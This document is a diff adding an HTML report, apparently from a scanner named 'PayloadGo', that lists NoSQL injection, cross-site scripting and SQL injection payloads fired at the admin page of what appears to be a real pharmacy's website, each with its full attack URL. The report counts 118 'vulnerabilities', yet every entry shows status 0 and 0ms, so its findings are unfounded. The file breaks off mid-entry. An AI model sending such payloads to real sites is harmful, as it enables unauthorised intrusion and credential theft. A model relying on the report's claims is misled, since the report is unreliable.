@@ -1,0 +1,847 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayloadGo Vulnerability Report</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 40px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grain" width="100" height="100" patternUnits="userSpaceOnUse"><circle cx="25" cy="25" r="1" fill="white" opacity="0.1"/><circle cx="75" cy="75" r="1" fill="white" opacity="0.1"/><circle cx="50" cy="10" r="0.5" fill="white" opacity="0.1"/><circle cx="10" cy="60" r="0.5" fill="white" opacity="0.1"/><circle cx="90" cy="40" r="0.5" fill="white" opacity="0.1"/></pattern></defs><rect width="100" height="100" fill="url(%23grain)"/></svg>');
+            opacity: 0.3;
+        }
+        
+        .header h1 {
+            font-size: 2.5em;
+            font-weight: 700;
+            margin-bottom: 10px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .header p {
+            font-size: 1.1em;
+            opacity: 0.9;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .content {
+            padding: 40px;
+        }
+        
+        .summary {
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            padding: 30px;
+            border-radius: 15px;
+            margin-bottom: 30px;
+            border-left: 5px solid #667eea;
+        }
+        
+        .summary h2 {
+            color: #2c3e50;
+            font-size: 1.8em;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+        
+        .stat {
+            background: white;
+            padding: 25px;
+            border-radius: 12px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+            transition: transform 0.3s ease;
+            border: 1px solid #e9ecef;
+        }
+        
+        .stat:hover {
+            transform: translateY(-2px);
+        }
+        
+        .stat-number {
+            font-size: 2.5em;
+            font-weight: 700;
+            color: #667eea;
+            margin-bottom: 5px;
+        }
+        
+        .stat-label {
+            font-size: 1em;
+            color: #6c757d;
+            font-weight: 500;
+        }
+        
+        .vuln-section {
+            margin: 30px 0;
+        }
+        
+        .vuln-type {
+            color: #dc3545;
+            font-size: 1.4em;
+            font-weight: 600;
+            margin-bottom: 20px;
+            padding: 15px 20px;
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a52 100%);
+            color: white;
+            border-radius: 10px;
+            display: inline-block;
+        }
+        
+        .vulnerability {
+            background: white;
+            border: 1px solid #e9ecef;
+            margin: 15px 0;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            transition: all 0.3s ease;
+            border-left: 4px solid #667eea;
+        }
+        
+        .vulnerability:hover {
+            box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+            transform: translateY(-1px);
+        }
+        
+        .vulnerability p {
+            margin-bottom: 12px;
+        }
+        
+        .vulnerability strong {
+            color: #2c3e50;
+            font-weight: 600;
+        }
+        
+        .payload {
+            font-family: 'Fira Code', 'Monaco', 'Consolas', monospace;
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            padding: 12px 15px;
+            border-radius: 8px;
+            word-break: break-all;
+            border: 1px solid #dee2e6;
+            font-size: 0.9em;
+            line-height: 1.4;
+        }
+        
+        .url {
+            color: #667eea;
+            word-break: break-all;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .url:hover {
+            text-decoration: underline;
+        }
+        
+        .response {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: 'Fira Code', 'Monaco', 'Consolas', monospace;
+            white-space: pre-wrap;
+            border: 1px solid #dee2e6;
+            font-size: 0.85em;
+            line-height: 1.4;
+        }
+        
+        .severity-high {
+            border-left-color: #dc3545;
+        }
+        
+        .severity-medium {
+            border-left-color: #ffc107;
+        }
+        
+        .severity-low {
+            border-left-color: #28a745;
+        }
+        
+        .footer {
+            background: #2c3e50;
+            color: white;
+            padding: 20px;
+            text-align: center;
+            font-size: 0.9em;
+        }
+        
+        @media print {
+            body {
+                background: white;
+                padding: 0;
+            }
+            .container {
+                box-shadow: none;
+                border-radius: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🛡️ PayloadGo Vulnerability Report</h1>
+            <p>Generated on 2025-10-25 17:37:18</p>
+        </div>
+        
+        <div class="content">
+            <div class="summary">
+                <h2>📊 Executive Summary</h2>
+                <div class="stats">
+                    <div class="stat">
+                        <div class="stat-number">118</div>
+                        <div class="stat-label">Total Vulnerabilities</div>
+                    </div>
+                    <div class="stat">
+                        <div class="stat-number">1</div>
+                        <div class="stat-label">Vulnerability Types</div>
+                    </div>
+                </div>
+            </div>
+            <div class="vuln-section">
+                <div class="vuln-type">🔍  (118 instances)</div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">{&#34;$ne&#34;: &#34;&#34;}</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%7B%22%24ne%22%3A+%22%22%7D</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">{&#34;$ne&#34;: null}</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%7B%22%24ne%22%3A+null%7D</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">{&#34;$ne&#34;: 0}</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%7B%22%24ne%22%3A+0%7D</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">{&#34;$where&#34;: &#34;true&#34;}</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%7B%22%24where%22%3A+%22true%22%7D</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">{&#34;$where&#34;: &#34;1==1&#34;}</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%7B%22%24where%22%3A+%221%3D%3D1%22%7D</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">{&#34;$where&#34;: &#34;this.username == this.password&#34;}</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%7B%22%24where%22%3A+%22this.username+%3D%3D+this.password%22%7D</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">{&#34;$where&#34;: &#34;this.username.length &gt; 0&#34;}</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%7B%22%24where%22%3A+%22this.username.length+%3E+0%22%7D</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">{&#34;$gt&#34;: 0}</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%7B%22%24gt%22%3A+0%7D</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">{&#34;$regex&#34;: &#34;.*&#34;}</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%7B%22%24regex%22%3A+%22.%2A%22%7D</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">{&#34;$gt&#34;: &#34;&#34;}</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%7B%22%24gt%22%3A+%22%22%7D</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">{&#34;$or&#34;: [{&#34;username&#34;: {&#34;$regex&#34;: &#34;.*&#34;}}, {&#34;password&#34;: {&#34;$regex&#34;: &#34;.*&#34;}}]}</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%7B%22%24or%22%3A+%5B%7B%22username%22%3A+%7B%22%24regex%22%3A+%22.%2A%22%7D%7D%2C+%7B%22password%22%3A+%7B%22%24regex%22%3A+%22.%2A%22%7D%7D%5D%7D</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">{&#34;$or&#34;: [{&#34;username&#34;: {&#34;$ne&#34;: null}}, {&#34;password&#34;: {&#34;$ne&#34;: null}}]}</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%7B%22%24or%22%3A+%5B%7B%22username%22%3A+%7B%22%24ne%22%3A+null%7D%7D%2C+%7B%22password%22%3A+%7B%22%24ne%22%3A+null%7D%7D%5D%7D</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">{&#34;$not&#34;: {&#34;username&#34;: null}}</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%7B%22%24not%22%3A+%7B%22username%22%3A+null%7D%7D</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&lt;script&gt;alert(1)&lt;/script&gt;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3Cscript%3Ealert%281%29%3C%2Fscript%3E</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">{&#34;$and&#34;: [{&#34;username&#34;: {&#34;$ne&#34;: null}}, {&#34;password&#34;: {&#34;$ne&#34;: null}}]}</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%7B%22%24and%22%3A+%5B%7B%22username%22%3A+%7B%22%24ne%22%3A+null%7D%7D%2C+%7B%22password%22%3A+%7B%22%24ne%22%3A+null%7D%7D%5D%7D</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&gt;&lt;img src=x onerror=alert(1)&gt;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&lt;svg onload=alert(1)&gt;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3Csvg+onload%3Dalert%281%29%3E</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">{&#34;$nor&#34;: [{&#34;username&#34;: null}, {&#34;password&#34;: null}]}</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%7B%22%24nor%22%3A+%5B%7B%22username%22%3A+null%7D%2C+%7B%22password%22%3A+null%7D%5D%7D</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&lt;img src=x onerror=alert(1)&gt;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">javascript:alert(1)</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=javascript%3Aalert%281%29</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&lt;textarea onfocus=alert(1) autofocus&gt;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3Ctextarea+onfocus%3Dalert%281%29+autofocus%3E</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&lt;body onload=alert(1)&gt;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3Cbody+onload%3Dalert%281%29%3E</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&lt;input onfocus=alert(1) autofocus&gt;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3Cinput+onfocus%3Dalert%281%29+autofocus%3E</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&lt;keygen onfocus=alert(1) autofocus&gt;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3Ckeygen+onfocus%3Dalert%281%29+autofocus%3E</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&lt;details open ontoggle=alert(1)&gt;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3Cdetails+open+ontoggle%3Dalert%281%29%3E</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E%3C%2Fiframe%3E</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&lt;audio src=x onerror=alert(1)&gt;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3Caudio+src%3Dx+onerror%3Dalert%281%29%3E</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&lt;video&gt;&lt;source onerror=alert(1)&gt;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3Cvideo%3E%3Csource+onerror%3Dalert%281%29%3E</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&lt;select onfocus=alert(1) autofocus&gt;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3Cselect+onfocus%3Dalert%281%29+autofocus%3E</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&lt;marquee onstart=alert(1)&gt;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3Cmarquee+onstart%3Dalert%281%29%3E</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&lt;object data=&#34;javascript:alert(1)&#34;&gt;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3Cobject+data%3D%22javascript%3Aalert%281%29%22%3E</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&lt;math&gt;&lt;mi//xlink:href=&#34;data:x,&lt;script&gt;alert(1)&lt;/script&gt;&#34;&gt;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3Cmath%3E%3Cmi%2F%2Fxlink%3Ahref%3D%22data%3Ax%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&lt;embed src=&#34;javascript:alert(1)&#34;&gt;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3Cembed+src%3D%22javascript%3Aalert%281%29%22%3E</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&#39; OR &#39;1&#39;=&#39;1</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%27+OR+%271%27%3D%271</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&#39; OR &#39;1&#39;=&#39;1&#39; --</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%27+OR+%271%27%3D%271%27+--</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&lt;table&gt;&lt;td background=&#34;javascript:alert(1)&#34;&gt;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3Ctable%3E%3Ctd+background%3D%22javascript%3Aalert%281%29%22%3E</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&#39; OR 1=1#</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%27+OR+1%3D1%23</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&#39; OR 1=1 --</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%27+OR+1%3D1+--</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&#39; OR 1=1/*</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%27+OR+1%3D1%2F%2A</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&#39; OR &#39;a&#39;=&#39;a</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%27+OR+%27a%27%3D%27a</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&#39; OR &#39;&#39; = &#39;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%27+OR+%27%27+%3D+%27</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&#39; AND sleep(3) --</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%27+AND+sleep%283%29+--</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&#39; AND 1=1 --</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%27+AND+1%3D1+--</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&#39; OR sleep(5)--</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%27+OR+sleep%285%29--</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&#39; UNION SELECT 1,2,3 --</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%27+UNION+SELECT+1%2C2%2C3+--</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&#39; AND 1=2 --</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%27+AND+1%3D2+--</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&#39; UNION SELECT null, null, null --</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%27+UNION+SELECT+null%2C+null%2C+null+--</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&#39; UNION SELECT username, password FROM users --</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%27+UNION+SELECT+username%2C+password+FROM+users+--</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">admin&#39; or &#39;1&#39;=&#39;1</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=admin%27+or+%271%27%3D%271</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&#34; OR &#34;1&#34;=&#34;1</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%22+OR+%221%22%3D%221</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&#34; OR sleep(3) --</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%22+OR+sleep%283%29+--</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&#34; AND 1=1 --</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%22+AND+1%3D1+--</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">1&#39; AND 1=2 --</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=1%27+AND+1%3D2+--</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&#34; AND 1=2 --</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%22+AND+1%3D2+--</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&#39;) OR (&#39;1&#39;=&#39;1</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%27%29+OR+%28%271%27%3D%271</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">1&#39; AND 1=1 --</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=1%27+AND+1%3D1+--</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">admin&#39;)--</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=admin%27%29--</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&#39; OR EXISTS(SELECT * FROM users) --</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%27+OR+EXISTS%28SELECT+%2A+FROM+users%29+--</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&#39; AND EXISTS(SELECT * FROM users WHERE username=&#39;admin&#39;) --</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%27+AND+EXISTS%28SELECT+%2A+FROM+users+WHERE+username%3D%27admin%27%29+--</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
